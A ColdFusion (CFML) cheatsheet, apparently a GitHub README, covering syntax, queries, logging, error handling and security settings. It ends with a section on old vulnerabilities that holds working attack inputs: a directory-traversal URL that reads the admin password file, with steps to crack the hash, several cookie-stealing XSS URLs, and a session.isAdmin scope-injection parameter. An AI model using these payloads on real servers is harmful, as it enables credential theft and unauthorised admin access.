# CFML cheatsheet
Master CF in no-time with these easy to remember (and free to use) CF cheat codes!<br>
You can open the <a href="https://stefanpejcic.github.io/coldfusion/">html version on github pages</a> or browse the code in markdown bellow.

## Set variables
Use <b>cfset</b> to create a variable (if it doesn't exist) and assign it a value. You can also use it to call functions.

##### Current time
```
<cfset currentTime = now() />
```

<hr>

##### Regular string

```
<cfset name = "Archi" />
```

<hr>

##### Integer

```
<cfset age = 29 />
```

<hr>

##### Concatenate variable and string

```
<cfset todayDate = "Today is: #now()#" />
<cfset greeting = "Hello " & name />
```

<hr>

##### Array

```
<cfset dataArray = [dateFormat(now(), "short"), dateFormat(dateadd('d',1,now()), "short"), "Me", 42] />
```

<hr>

##### Data structure

```
<cfset dictionary = { today = dateFormat(now(), "short"), tomorrow = dateFormat(dateadd('d', 1, now()), "short"), who = "Me", the_answer_to_life_and_everything_else = 42 } />
```


## Print out
##### Hard coded string
```
<cfdump var = "This is a message for you" />
<cfoutput>This is a message for you</cfoutput>
```

<hr>

##### Variable

```
<cfdump var = "#name#" /> _same as inspect in ruby_
<cfoutput>#name#</cfoutput> _same as puts in ruby_
```

## Loops
There are several different types of for and while loops in ColdFusion.
For more info please see the docs for <a href="https://cfdocs.org/cfscript">cfloop</a>.

##### FOR loop
```
for (i=1;i LTE ArrayLen(array);i=i+1) {
	WriteOutput(array[i]);
}
```

<hr>

##### While loop

```
x = 0;
while (x LT 5) {
	x = x + 1;
	WriteOutput(x);
}
```
```
//OUTPUTS 12345
```

<hr>

##### Do While loop

```
x = 0;
do {
 x = x+1;
 WriteOutput(x);
} while (x LTE 0);
```
```
// OUTPUTS 1
```

<hr>

##### FOR IN loop (Structure)

```
struct = StructNew();
struct.one = "1";
struct.two = "2";
for (key in struct) {
	WriteOutput(key);
}
```
```
//OUTPUTS onetwo
```

<hr>

##### FOR IN loop (Array)

```
cars = ["Ford","Dodge"];
for (car in cars) {
	WriteOutput(car);
}
```
```
//OUTPUTS FordDodge
```

<hr>

##### FOR IN loop (Query)

```
cars = QueryNew("make,model",
	"cf_sql_varchar,cf_sql_varchar",
	[["Ford", "T"],["Dodge","30"]]);
for (car in cars) {
	WriteOutput("Model " & car.model);
}
```
```
//OUTPUTS Model TModel 30
```
## Structures
This are like dictionaries in Python or hashes in Ruby.

##### Create structure literal
```
<cfset aGuy = {} />
<cfset batman = {
    "first_name" = "Bruno",
    "last_name" = "Diaz",
    "age" = 42
} />
```

<hr>

##### Constructor

```
<cfset aGuy = structNew() />
```

<hr>

##### Adding elements with brackets

```
<cfset aGuy["first_name"] = "Ezequiel" />
<cfset aGuy["last_name"] = "Lopez" />
```

<hr>

##### Concatenate variable and string

```
<cfset todayDate = "Today is: #now()#" />
<cfset greeting = "Hello " & name />
```

<hr>

##### Adding elements with dot notation

```
<cfset aGuy.age = 29 />
<cfset aGuy.height = "5' 11\"" />
```

<hr>

##### Looping over the structure

```
<cfloop collection = "aGuy" item = "data">
    <cfoutput>#aGuy[data]#: #data#</cfoutput>
</cfloop>
```

## Queries
Use SQL in coldfusion to retrieve data form a database or enter data in it.

##### Simple Query
```
var queryOptions = { datasource: "appMain" };
var data = queryExecute(
  "SELECT * FROM users", {}, queryOptions
);
```

<hr>

##### Allocate query result into variable & retrieve info

```
<cfquery name="firstQ" datasource="tsdata.ts24">
    SELECT * FROM TestTable
</cfquery>
```

<hr>

##### Looping over the Query

```
<cfoutput>
    <cfloop query="#firstQ#">
        <p><i>myDataAlfa: </i>#firstQ.myDataAlfa# <i>myDataInt: </i>#firstQ.myDataInt#</p>
    </cfloop>
    
    <!--- Extra data to get from the query --->
    <p>#firstQ.columnlist#</p>
    <p>#firstQ.recordcount#</p>
</cfoutput>
```

##### Allocate query result into variable & retrieve info

```
<cfquery name="firstQ" datasource="tsdata.ts24">
    SELECT * FROM TestTable
</cfquery>
```

<hr>

##### Looping over the Query

```
<cfoutput>
    <cfloop query="#firstQ#">
        <p><i>myDataAlfa: </i>#firstQ.myDataAlfa# <i>myDataInt: </i>#firstQ.myDataInt#</p>
    </cfloop>
    
    <!--- Extra data to get from the query --->
    <p>#firstQ.columnlist#</p>
    <p>#firstQ.recordcount#</p>
</cfoutput>
```

## Logging
Use <b>cflog</b> to write a message to a log file.

##### Simple Log
```
<cflog file="myAppLog" application="no"
text="User #Form.username# logged on.">
```

<hr>

##### Clear Log File

```
var logDir = expandPath( "/logs/" );
var logs = directoryList(
  path = logDir,
  listInfo = "name",
  filter = "*.log",
  type = "file",
  recurse = "false"
);
for( var log in logs ){
  var fullPath = logDir & log ;
  if( fileExists( fullPath ) ){
    fileDelete( fullPath );
  }
}
```

<hr>

##### Log Error in Log File

```
component {
  // ...
  function onError( exception ){
   // uLogging error with logbox...
    writeOutput( "Writting to error log.." );
    logger.error(
        "Error occured in application: #exception.message# #exception.detail#"
        exception
    );

    // error page
    include "views/error.cfm";
  }
}
```

## Security
Security-related settings for Application.cfc file

##### App Lock-down
```
// Application.cfc

component {
  this.name = "myApp";
  this.blockedExtForFileUpload = "*";
  this.scriptProtect					 = "all";
  this.sessioncookie = {
    httpOnly: true,
    secure  : true
  };
}
```


## Error Handling
ColdFusion provides a variety of tools to customize error information and handle errors when they occur.

##### Try / Catch / Throw / Finally / Rethrow
```
try {
	throw(message="Oops", detail="xyz");
} catch (any e) {
	WriteOutput("Error: " & e.message);
	rethrow;
	
} finally {
	WriteOutput("I run even if no error");
}
```

<hr>

##### OnError Exception

```
  public function onError(required exception, required string eventName)
  {
    var factory = new App.ExceptionFactory();
    var e = factory.getNewException(arguments.eventName, arguments.exception);
    if (e.logError()) {
    
      /** we cauld also have a logging cfc etc **/
      var loggingFile = new App.SomeLoggingCfc(arguments.eventName, arguments.exception);
      loggingFile.commitLog();
    }
    if (e.debugError()) {}
    e.throwException();
  } 
  public ExceptionFactory function getNewException(required string eventName, required exception)
  {
    return new "App.#exception.type#"(argumentCollection = arguments);
  } 
  public boolean function logError() {}
  public boolean function debugError() {}
  public function throwException() {}
```

## Debugging
You can use CFML tags and functions to display or hide debugging and tracing information.

##### Control Debugging Output
```
<cfsetting showDebugOutput="No">
```

<hr>

##### Show Query execution time

```
<cfquery name="TestQuery" datasource="cfexample" debug>
SELECT * FROM TestTable
</cfquery>
```
<hr>

##### Log Values to MyAppSilentTrace.log

```
<cfif IsDebugMode()>
<cflog file="MyAppSilentTrace" text="Page: #cgi.script_name#,
completed query MyDBQuery; Query Execution time:
#cfquery.ExecutionTime# Status: #Application.status#">
</cfif>
```


## Comments
ColdFusion comments have a similar format to HTML comments but use three dash characters instead of two.

##### Single line comment
```
<!--- This is a ColdFusion Comment. Browsers do not receive it. --->
```

<hr>

##### Inline comment

```
mojo = 1; //THIS IS A COMMENT
```
<hr>

##### Multiline comment

```
/* This is a comment
	that can span
	multiple lines
*/
```

## Vulnerabilities
ColdFusion had a lot of security vulnerabilities in the past, so stop using older versions!

##### # Adobe ColdFusion Unspecified Directory Traversal Vulnerability
detailed information about the exploitation of this vulnerability: http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
1. open file in browser
```
http://[server:port]/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

<hr>

2. copy the hashed password

```
#Fri Feb 07 05:48:45 PST 2020 rdspassword= password=42DABCDFADADASASAS4891539FASDA11CA5 encrypted=true
```
<hr>

3. compare with rainbow tables

```
https://www.dcode.fr/sha1-hash
```


##### # Adobe ColdFusion Server Query String Cross-Site Scripting
detailed information about the exploitation of this vulnerability: https://www.securityfocus.com/bid/36046/info-directory-traversal-faq-cve-2010-2861/
1. open file in browser
```
http://www.example.com:8500/CFIDE/componentutils/componentdetail.cfm?component=<body%20onload=alert(document.cookie)>
```

<hr>

```
http://www.example.com:8500/CFIDE/componentutils/cfcexplorer.cfc?method=getcfcinhtml&name=%3Cbody%20onload=alert(document.cookie)%3E

```

<hr>

```
http://www.example.com:8500/CFIDE/componentutils/cfcexplorer.cfc?method=%3Cbody%20onload=alert(document.cookie)%3E
```

<hr>

##### # Adobe ColdFusion Server Scope Injection
detailed information about the exploitation of this vulnerability: https://www.petefreitag.com/item/834.cfm

1. open any action (that checks session.isAdmin) in browser
```
http://www.example.com:8500/CFIDE/componentutils/componentdetail.cfm
```

<hr>

2. append the following to the url

```
?session.isAdmin=1
```
